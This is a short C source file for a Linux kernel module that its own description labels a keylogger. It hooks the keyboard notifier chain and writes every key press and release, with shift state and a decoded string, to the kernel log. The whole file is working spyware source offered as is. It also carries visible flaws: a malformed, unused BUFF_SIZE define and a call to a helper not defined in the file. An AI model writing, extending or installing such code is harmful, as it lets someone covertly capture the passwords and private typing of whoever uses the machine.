#include<linux/module.h>
#include<linux/kernel.h>
#include<linux/init.h>
#include<linux/keyboard.h>
#include <linux/notifier.h>

MODULE_LICENSE("GPL");		// GNU General Public License
MODULE_AUTHOR("mademir");
MODULE_DESCRIPTION("Keylogger");

#define BUFF_SIZE = 16;


static int	log_func(struct notifier_block *nb, unsigned long action, void *data)
{
    struct keyboard_notifier_param *param = data;
	char	buff[16];

    if (action == KBD_KEYCODE) {
        printk(KERN_INFO "Key %i %s, shift: %s\n", param->value, param->down ? "pressed" : "released", param->shift ? "true" : "false");
		keycode_to_us_string(param->value, param->shift, buff, 16);
		printk(KERN_INFO "Okunabilir: %s\n", buff);
    }

    return NOTIFY_OK;
}

static struct notifier_block	keyboard_notifier;

static int	__init ModuleInit(void)
{
	printk(KERN_INFO "Keylogger: load module\n");

	keyboard_notifier.notifier_call = log_func;

	int ret = register_keyboard_notifier(&keyboard_notifier);
	if (ret)
	{
		printk(KERN_INFO "Keylogger: keyboard notifier failed to register\n");
	}
	else
	{
		printk(KERN_INFO "Keylogger: keyboard notifier registered\n");
	}

	return (0);
}

static void	__exit ModuleExit(void)
{
	printk(KERN_INFO "Keylogger: exit module\n");

	unregister_keyboard_notifier(&keyboard_notifier);
	return ;
}

module_init(ModuleInit);
module_exit(ModuleExit);
